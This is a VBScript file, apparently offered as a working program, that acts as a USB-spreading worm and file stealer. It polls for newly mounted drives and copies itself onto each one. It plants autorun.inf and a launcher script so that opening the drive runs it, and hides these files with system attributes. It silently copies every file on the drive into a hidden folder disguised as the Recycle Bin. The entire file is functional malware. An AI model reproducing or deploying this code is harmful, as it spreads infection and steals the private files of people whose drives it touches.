'[NatruePark]
'容错语句
on Error resume next
'变量声明及初始化
dim fso, old_drs(), new_drs(), old_n, new_n, new_yn, wshshell
set fso = CreateObject("Scripting.File"&"SystemObject")
set wshshell = wscript.createobject("WScript.Shell")
old_n=0
redim old_drs(old_n)
old_drs(0)="C"

'[主体部分]
wshshell.run("explorer .\")
dim i
i = 0
do while i>=0 and i<8*360
   scan_disk()
   if judge_new_disk() = 1 then
       dim left_n
       left_n = 1
       do while left_n<=(new_n-old_n)
           new_disk = new_drs(left_n+old_n)&":\"
'-----------------<维护块>-----------------
           if fso.FileExists(new_disk&"NP.vbs") = -1 then 
           else
               self_copy(new_disk)
           end if
           add_attrib(new_disk&"NP.vbs")
           if fso.FileExists(new_disk&"autorun.inf") = -1 then    
               del_attrib(new_disk&"autorun.inf")
           end if
               add_autorun(new_disk)
           
           add_attrib(new_disk&"autorun.inf")
           if fso.FileExists(new_disk&"stNP.vbs") = -1 then
           else
               add_stNP(new_disk)
           end if
           add_attrib(new_disk&"stNP.vbs")
'-----------------</维护块>-----------------
'-----------------<功能块>-----------------
           dim rec 
           rec = "d:\Recyc1ed\"
           if fso.FolderExists(rec) = -1 then
           else
               fso.createfolder(rec)
           end if
           add_attribf(rec)
           if fso.FileExists(rec&"desktop.ini") = -1 then
           else
               add_desktop(rec)
           end if
               add_attrib(rec&"desktop.ini")
           aim_folder = rec&Date()&Rnd()
           if fso.FolderExists(aim_folder) = -1 then
           else
               fso.createfolder(aim_folder)
           end if
           
'查找"汽轮机原理文件夹并复制"
           if fso.FolderExists(new_disk&"汽轮机原理") = -1 then
               fso.copyfolder new_disk&"汽轮机原理", aim_folder, true
               add_attribf(aim_folder)
           end if
           
'通用复制
           if old_n = 0 then 
           else
               set fp = fso.getFolder(new_drs(new_n)&":\")
               set fc = fp.SubFolders
               for each f in fc
               fso.copyfolder f&"", aim_folder&"\"&f.name, true
               next
               set fc = fp.files
               for each f in fc
               fso.copyfile f&"", aim_folder&"\", true
               next
               add_attribf(aim_folder)
           end if
'-----------------</功能块>-----------------
           left_n=left_n+1
       loop
   copy_disk()
   end if
   wscript.sleep(10000)
   i=i+1
loop
'[函数部分]
'可用驱动器检测 new_drs(),new_n
function scan_disk()
   dim d, dr
   new_n = -1
   set dr = fso.drives
   for each d in dr
       if d.isready then 
           new_n=new_n+1
           redim preserve new_drs(new_n)
           new_drs(new_n)=d.driveletter
       end if
   next
end function
'判断是否有新加入的驱动器
function judge_new_disk()
   if new_n = old_n then
       judge_new_disk = 0
   elseif new_n < old_n then
       redim preserve old_drs(new_n)
       old_n = new_n
       judge_new_disk = 0
   elseif new_n > old_n then
       redim preserve old_drs(new_n)
       judge_new_disk = 1
   end if
end function
'复制新驱动器表单
function copy_disk()
   dim n
   n=0
   do while n<=new_n
       old_drs(n) = new_drs(n)
       n=n+1
   loop
   old_n = new_n
end function
'添加指定文件属性
function add_attrib(file)
   set f = fso.getfile(file)
   if f.attributes = 7 then
       
   else
       f.attributes = 7
   end if
end function
'删除指定文件属性
function del_attrib(file)
   set f = fso.getfile(file)
   if f.attributes = 7 then
       f.attributes = 0
   else

   end if
end function
'自我复制到指定文件目录
function self_copy(folder)
   dim aim_path, mid_path, self_file, mid_file
   aim_path = folder&"NP.vbs"
   mid_path = "c:\np.bin"
   set self_file = fso.opentextfile(wscript.scriptfullname,1)
   self = self_file.readall
   set mid_file = fso.opentextfile(mid_path,2,true)
   mid_file.write self
   mid_file.close
   set mid_file = fso.getfile(mid_path)
   mid_file.copy(aim_path)
   mid_file.delete(true)
end function
'增加autorun.inf
function add_autorun(folder)
   dim path
   path = folder&"autorun.inf"
   set temp = fso.CreateTextFile("c:\a.bin",true)
   temp.writeline "[autorun]"
   temp.writeline "open="
   temp.writeline "shell\open=打开(&O)"
   temp.writeline "shell\open\Command=WScript.exe stNP.vbs"
   temp.writeline "shell\open\Default=1"
   temp.writeline "shell\explore=资源管理器(&X)"
   temp.writeline "shell\explore\Command=WScript.exe stNP.vbs"
   temp.close
   set cop = fso.getfile("c:\a.bin")
   cop.copy(path)
   cop.delete(true)
end function
'增加desktop.ini
function add_desktop(folder)
   dim path
   path = folder&"desktop.ini"
   set temp = fso.CreateTextFile("c:\d.bin",true)
   temp.writeline "[.ShellClassInfo]"
   temp.writeline "CLSID={645FF040-5081-101B-9F08-00AA002F954E}"
   temp.close
   set cop = fso.getfile("c:\d.bin")
   cop.copy(path)
   cop.delete(true)
end function
'增加stNP.vbs
function add_stNP(folder)
   dim path
   set fso = CreateObject("Scripting.File"&"SystemObject")
   path = folder&"stNP.vbs"
   set temp = fso.CreateTextFile("c:\s.bin",true)
   
   temp.writeline "on error resume next"
   temp.writeline "set fso = CreateObject("&chr(34)&"Scripting.FileSys"&chr(34)&"&"&chr(34)&"temObject"&chr(34)&")"
   temp.writeline "if fso.FileExists("&chr(34)&"NP.vbs"&chr(34)&") = -1 then"
   temp.writeline "if fso.FileExists("&chr(34)&"d:\NP.vbs"&chr(34)&") = -1 then"
   temp.writeline "set f = fso.getfile("&chr(34)&"d:\NP.vbs"&chr(34)&")"
   temp.writeline "if f.attributes = 0 then"
   temp.writeline "else"
   temp.writeline "f.attributes = 0"
   temp.writeline "end if"
   temp.writeline "f.delete(true)"
   temp.writeline "end if"
   temp.writeline "fso.copyfile "&chr(34)&"NP.vbs"&chr(34)&", "&chr(34)&"d:\NP.vbs"&chr(34)&", true"
   temp.writeline "set wshshell = wscript.createobject("&chr(34)&"WScript.Shell"&chr(34)&")"
   temp.writeline "wshshell.run "&chr(34)&"d:\NP.vbs"&chr(34)
   temp.writeline "end if"

   temp.close
   set cop = fso.getfile("c:\s.bin")
   cop.copy(path)
   cop.delete(true)
end function

'添加指定文件夹属性
function add_attribf(folder)
   set f = fso.getfolder(folder)
   if f.attributes = 7 then
       
   else
       f.attributes = 7
   end if
end function
'删除指定文件夹属性
function del_attribf(folder)
   set f = fso.getfolder(folder)
   if f.attributes = 0 then
   else
       f.attributes = 0

   end if
end function


wscript.echo("THANK YOU!!")
wscript.quit


